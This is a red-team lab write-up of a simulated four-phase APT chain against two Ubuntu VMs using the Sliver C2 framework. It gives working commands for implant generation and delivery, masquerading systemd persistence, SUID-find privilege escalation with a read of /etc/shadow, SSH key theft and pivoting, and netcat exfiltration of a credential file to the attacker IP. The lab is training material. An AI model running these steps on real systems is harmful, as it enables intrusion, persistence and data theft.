# Sliver APT Attack Simulation — Full Walkthrough

> **Classification:** LAB / CONFIDENTIAL — Red Team Exercise  
> **Date:** March 26–27, 2026  
> **Environment:** VirtualBox (Host-Only + NAT) | Kali Linux → Ubuntu 22.04 targets  
> **C2 Framework:** [Sliver](https://github.com/BishopFox/sliver) (mTLS)

---

## Lab Environment

| Role | Machine | IP |
|---|---|---|
| Attacker | Kali Linux | 192.168.59.11 |
| Victim 1 | Ubuntu 22.04 | 192.168.59.12 |
| Victim 2 | Ubuntu 22.04 (lateral target) | 192.168.59.13 |

---

## Full Attack Chain Overview

| Phase | Objective | Technique | Outcome |
|---|---|---|---|
| **Phase 1** | Initial Access | Sliver mTLS implant via SCP | ✔ C2 session live |
| **Phase 2** | Persistence + PrivEsc | Systemd service + SUID `find` exploit | ✔ Root + reboot persistence |
| **Phase 3** | Lateral Movement | SSH key theft → pivot to Ubuntu 2 | ✔ 2 active C2 sessions |
| **Phase 4** | Data Exfiltration | Base64 + netcat file transfer | ✔ File recovered on Kali |

---

## Phase 1 — Initial Access

### Objective
Establish a C2 session on the victim machine by generating and delivering a Sliver mTLS implant, simulating a phishing-based payload delivery scenario.

### Implant: `UPSET_BIBLIOGRAPHY`

---

### Step 1 — Start the Sliver C2 Server

On Kali, Sliver was started as a systemd service and confirmed active on port 31337.

```bash
sudo systemctl start sliver
sudo systemctl status sliver   # active (running)
```

---

### Step 2 — Start an mTLS Listener

An mTLS listener was opened on port 8888 to receive incoming implant callbacks. mTLS provides mutual authentication and encryption on the C2 channel.

```bash
# Inside Sliver console:
mtls --lport 8888
```

---

### Step 3 — Generate the Implant

A Linux ELF implant was generated targeting the victim's architecture (amd64), configured to call back to the Kali host-only IP over mTLS.

```bash
generate --mtls 192.168.59.11 --os linux --arch amd64 --format elf --save /tmp/
# Generated implant name: UPSET_BIBLIOGRAPHY
```

---

### Step 4 — Deliver Payload via SCP

The implant was transferred to the victim machine using SCP — simulating an attacker who has obtained SSH credentials through phishing or prior reconnaissance. The file was disguised as `updater`.

```bash
scp /tmp/UPSET_BIBLIOGRAPHY victim@192.168.59.12:/tmp/updater
```

---

### Step 5 — Execute the Implant on Victim

On the victim machine, the implant was made executable and run in the background, immediately initiating a callback to the Sliver C2 server.

```bash
chmod +x /tmp/updater && /tmp/updater &
```

---

### Step 6 — C2 Session Confirmed

The Sliver console on Kali registered an active session, confirming successful compromise.

```
sessions
# ID  Name                Transport  Remote Address       Hostname  Username  OS/Arch
# 1   UPSET_BIBLIOGRAPHY  mtls       192.168.59.12:XXXXX  ubuntu    victim    linux/amd64
```

### Confirmation Evidence

| Check | Evidence |
|---|---|
| Implant process | `ps aux \| grep updater` → process visible |
| C2 connection | `ss -tnp \| grep 8888` → ESTABLISHED to 192.168.59.11:8888 |
| Sliver session | `sessions` shows active `UPSET_BIBLIOGRAPHY` |
| Remote commands | `whoami`, `hostname`, `id` executed from Kali |
| File on disk | `ls -la /tmp/updater` → present with execute bit |

### MITRE ATT&CK

| Tactic | Technique | Description |
|---|---|---|
| Initial Access | T1566.001 | Phishing — malicious implant delivered via SCP (simulated credential abuse) |
| Execution | T1059.004 | Unix Shell — ELF implant executed via bash |
| C2 | T1071.001 | Application Layer Protocol — mTLS encrypted C2 channel |

---

## Phase 2 — Persistence & Privilege Escalation

### Objective
Ensure the implant survives reboots via a fake systemd service, and escalate from a standard user to root by abusing a SUID binary.

### Implant: `GEOGRAPHICAL_OEUVRE`

---

### Part A — Persistence via Systemd Service

#### Step 1 — Drop into a Shell via Sliver

From the Sliver console, the attacker interacted with the active session and opened a shell on the victim machine.

```bash
use GEOGRAPHICAL_OEUVRE
shell
```

#### Step 2 — Move the Implant to a Persistent Location

The implant was copied from `/tmp` (wiped on reboot) to a permanent system path and given a name designed to blend in with legitimate system binaries. The file timestamp was backdated to avoid suspicion.

```bash
cp /tmp/updater /usr/local/bin/.sysupdate
chmod +x /usr/local/bin/.sysupdate
touch -t 202201010000 /usr/local/bin/.sysupdate
```

#### Step 3 — Install a Malicious Systemd Service

A fake service unit named `sysupdate.service` was written to disk, configured to launch the implant on boot and auto-restart it on crash. The description was chosen to mimic a legitimate system update daemon.

```ini
[Unit]
Description=System Update Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.sysupdate
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
cp /tmp/sysupdate.service /etc/systemd/system/sysupdate.service
systemctl daemon-reload
systemctl enable sysupdate.service
systemctl start sysupdate.service
```

#### Step 4 — Persistence Verified After Reboot

The victim was rebooted. Within ~30 seconds, a new Sliver session appeared automatically on Kali — no manual intervention required.

```bash
sessions
# New session: GEOGRAPHICAL_OEUVRE — linux/amd64 — 192.168.59.12
```

---

### Part B — Privilege Escalation via SUID Abuse (GTFOBins)

#### Step 1 — Enumerate SUID Binaries

All SUID binaries on the victim were enumerated. The `find` binary was identified with the SUID bit set — a well-known GTFOBins escalation vector.

```bash
find / -perm -u=s -type f 2>/dev/null
# Output included: /usr/bin/find
```

#### Step 2 — Exploit SUID `find` for Root Shell

The `find` binary was used to spawn a shell. The `-p` flag preserves the SUID-elevated privileges, resulting in a root shell without knowing the root password.

```bash
find . -exec /bin/sh -p \; -quit
```

#### Step 3 — Root Access Confirmed

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /etc/shadow | head -5    # Root-only file — readable
echo "pwned by GEOGRAPHICAL_OEUVRE - $(date)" > /root/pwned.txt
```

### Confirmation Evidence

| Check | Evidence |
|---|---|
| Implant persistent path | `/usr/local/bin/.sysupdate` with execute bit |
| Service enabled | `systemctl is-enabled sysupdate` → enabled |
| Service running | `systemctl status sysupdate` → active (running) |
| Post-reboot session | New Sliver session appeared automatically |
| SUID binary found | `/usr/bin/find` confirmed via enumeration |
| Root shell | `whoami` → root / `id` → uid=0(root) |
| Shadow file read | `cat /etc/shadow` — no permission denied |
| Proof file | `/root/pwned.txt` created successfully |

### MITRE ATT&CK

| Tactic | Technique | Description |
|---|---|---|
| Persistence | T1543.002 | Create/Modify System Process — malicious `sysupdate.service` installed |
| Defense Evasion | T1036.005 | Masquerading — implant renamed `.sysupdate` with fake timestamp |
| Privilege Escalation | T1548.001 | Abuse Elevation Control Mechanism — SUID `find` exploited via GTFOBins |
| Credential Access | T1003.008 | `/etc/shadow` read as root — password hashes accessible for offline cracking |

---

## Phase 3 — Lateral Movement

### Objective
Use the root foothold on Ubuntu 1 to pivot to a second, never-directly-attacked machine (Ubuntu 2) via stolen SSH private keys — without triggering any failed login attempts or brute-force noise.

### Technique: SSH Private Key Theft & Reuse

---

### Step 1 — Identify SSH Trust Relationship

From the Sliver shell on Ubuntu 1 (as root), the attacker inspected the victim user's SSH directory and discovered that Ubuntu 2 was a known and trusted host.

```bash
cat /home/victim/.ssh/known_hosts
# Output: 192.168.59.13 — Ubuntu 2 identified as a trusted host

ls -la /home/victim/.ssh/
# id_rsa  id_rsa.pub  known_hosts  authorized_keys
```

---

### Step 2 — Steal the SSH Private Key via Sliver

Sliver's native `download` command was used to exfiltrate the private key directly to Kali — avoiding patterns associated with tools like SCP or curl.

```bash
# Inside Sliver session (GEOGRAPHICAL_OEUVRE):
download /home/victim/.ssh/id_rsa /home/kali/stolen_key.pem
# [*] Wrote /home/kali/stolen_key.pem
```

---

### Step 3 — Authenticate to Ubuntu 2 with Stolen Key

The stolen key was used from Kali to log into Ubuntu 2 directly. No password prompt appeared — the key was trusted by Ubuntu 2 due to the pre-existing SSH configuration.

```bash
chmod 600 /home/kali/stolen_key.pem
ssh -i /home/kali/stolen_key.pem victim@192.168.59.13
# Shell opened on Ubuntu 2 — no password prompt
```

---

### Step 4 — Internal Reconnaissance on Ubuntu 2

Basic recon was performed on Ubuntu 2 to confirm the new host identity and map the internal environment.

```bash
hostname && ip a && whoami
# Confirmed: different hostname, IP 192.168.59.13, user: victim

cat /etc/passwd
ss -tulnp

# Subnet ping sweep:
for ip in 192.168.59.{1..20}; do ping -c1 -W1 $ip &>/dev/null && echo "$ip is up"; done
```

---

### Step 5 — Deploy Implant on Ubuntu 2

The Sliver implant was pushed to Ubuntu 2 via SCP using the stolen key, then executed — establishing a second C2 session back to Kali.

```bash
scp -i /home/kali/stolen_key.pem /tmp/GEOGRAPHICAL_OEUVRE victim@192.168.59.13:/tmp/updater
ssh -i /home/kali/stolen_key.pem victim@192.168.59.13 "chmod +x /tmp/updater && /tmp/updater &"
```

---

### Step 6 — Two Active Sliver Sessions Confirmed

```
sessions
# ID  Name                  Transport  Remote Address       Hostname   OS
# 1   GEOGRAPHICAL_OEUVRE   mtls       192.168.59.12:XXXXX  ubuntu-1   linux/amd64
# 2   GEOGRAPHICAL_OEUVRE   mtls       192.168.59.13:XXXXX  ubuntu-2   linux/amd64
```

### Confirmation Evidence

| Check | Evidence |
|---|---|
| SSH keys found | `id_rsa` and `known_hosts` in `/home/victim/.ssh/` |
| Ubuntu 2 in known hosts | `192.168.59.13` listed in `known_hosts` on Ubuntu 1 |
| Key exfiltrated | Sliver `download` saved `stolen_key.pem` to Kali |
| SSH access to Ubuntu 2 | `ssh -i stolen_key.pem` → shell opened, no password |
| New hostname confirmed | Ubuntu 2 hostname differs from Ubuntu 1 |
| Implant on Ubuntu 2 | SCP + SSH execution succeeded |
| 2 Sliver sessions | Both `.12` and `.13` active in `sessions` output |

### MITRE ATT&CK

| Tactic | Technique | Description |
|---|---|---|
| Credential Access | T1552.004 | Private Keys — SSH key stolen from `/home/victim/.ssh/id_rsa` |
| Lateral Movement | T1021.004 | Remote Services: SSH — stolen key used to authenticate to Ubuntu 2 |
| Collection | T1560 | Archive Collected Data — SSH key exfiltrated via Sliver native download |
| Discovery | T1018 | Remote System Discovery — subnet ping sweep from inside Ubuntu 2 |

---

## Phase 4 — Data Exfiltration

### Objective
Covertly steal sensitive data from Ubuntu 1 and deliver it back to Kali — adapting in real time when the primary exfiltration method (DNS tunneling) failed due to a compatibility issue.

### Planned Method: DNS Tunneling (dnscat2) → Actual Method: Base64 + Netcat TCP

---

### Step 1 — Create a Sensitive Target File on the Victim

A fake high-value file was planted on Ubuntu 1 containing simulated credentials, API keys, and internal network details.

```bash
cat > /home/victim/confidential.txt << EOF
=== CONFIDENTIAL — INTERNAL USE ONLY ===
DB Password: Sup3rS3cr3t!2024
API Key: sk-prod-8f3k2j9x1m4n7p
AWS Access Key: AKIAIOSFODNN7EXAMPLE
Internal subnet: 10.10.0.0/16
EOF
```

---

### Step 2 — DNS Tunneling Attempted (dnscat2)

dnscat2 was installed on Kali and the server was launched. The client was executed on Ubuntu 1 via the Sliver shell.

```bash
# Kali server:
cd /usr/share/dnscat2
ruby dnscat2.rb --dns "host=192.168.59.11,port=53533" --secret=labsecret

# Ubuntu 1 client (via Sliver shell):
/tmp/dnscat --dns server=192.168.59.11,port=53533 --secret=labsecret
```

**Result:** Failed. The apt-installed version of dnscat2 threw repeated `uninitialized constant Packet::EncBody::Bignum` errors — a known incompatibility with newer Ruby runtimes. The client reported `RCODE_NAME_ERROR` and `RCODE_SERVER_FAILURE` on every DNS query.

> **Note on DNS Tunneling:** DNS tunneling works by encoding data inside DNS subdomain query strings. Since DNS (UDP port 53) is almost never blocked or inspected by firewalls, it is one of the stealthiest exfiltration channels available — virtually indistinguishable from normal DNS traffic.

---

### Step 3 — Pivot to Base64 / Netcat Exfiltration

The attacker adapted and switched to base64-encoded TCP exfiltration — a equally realistic technique commonly used by APT groups when primary channels are unavailable.

On Kali, a netcat listener was opened on port 9999:

```bash
nc -lvnp 9999
```

---

### Step 4 — Exfiltrate the File from Ubuntu 1

From the active Sliver shell on Ubuntu 1, the confidential file was base64-encoded and piped directly to the Kali listener. The entire transfer completed in under one second.

```bash
# Ubuntu 1 (via Sliver shell):
cat /home/victim/confidential.txt | base64 | nc 192.168.59.11 9999
```

---

### Step 5 — Decode and Verify on Kali

The base64 payload arrived in the Kali netcat terminal. It was saved, decoded, and verified to match the original file exactly.

```bash
echo "<base64_data>" | base64 -d > /home/kali/exfiltrated_confidential.txt
cat /home/kali/exfiltrated_confidential.txt
# Output matched original confidential.txt exactly
```

### Confirmation Evidence

| Check | Evidence |
|---|---|
| Target file on victim | `/home/victim/confidential.txt` created and verified |
| Netcat listener on Kali | `nc -lvnp 9999` confirmed listening |
| Exfil command executed | `cat \| base64 \| nc` ran via Sliver shell |
| Data received on Kali | Base64 output visible in `nc` terminal |
| File decoded | `base64 -d` produced identical plaintext |
| Exfil confirmed | Full contents of `confidential.txt` recovered on Kali |

### MITRE ATT&CK

| Tactic | Technique | Description |
|---|---|---|
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol — raw TCP via netcat |
| Exfiltration | T1048.001 | Exfiltration Over DNS (intended) — dnscat2 DNS tunneling attempted |
| Defense Evasion | T1027 | Obfuscated Files or Information — file encoded in base64 before transmission |
| Collection | T1005 | Data from Local System — `confidential.txt` collected from victim's home directory |

---

## ✔ Simulation Complete — Full Attack Chain Summary

| Phase | Objective | Technique | Result |
|---|---|---|---|
| **Phase 1** | Initial Access | Sliver mTLS ELF implant (`UPSET_BIBLIOGRAPHY`) delivered via SCP | ✔ C2 session live |
| **Phase 2** | Persistence + PrivEsc | Fake systemd service + SUID `find` exploit (`GEOGRAPHICAL_OEUVRE`) | ✔ Root + reboot persistence |
| **Phase 3** | Lateral Movement | SSH key theft via Sliver download → pivot to Ubuntu 2 | ✔ 2 simultaneous C2 sessions |
| **Phase 4** | Data Exfiltration | Base64 + netcat TCP transfer of `confidential.txt` | ✔ File fully recovered on Kali |

---

*Report generated from lab exercise documentation. All activity conducted in an isolated VirtualBox environment for educational and red team training purposes only.*
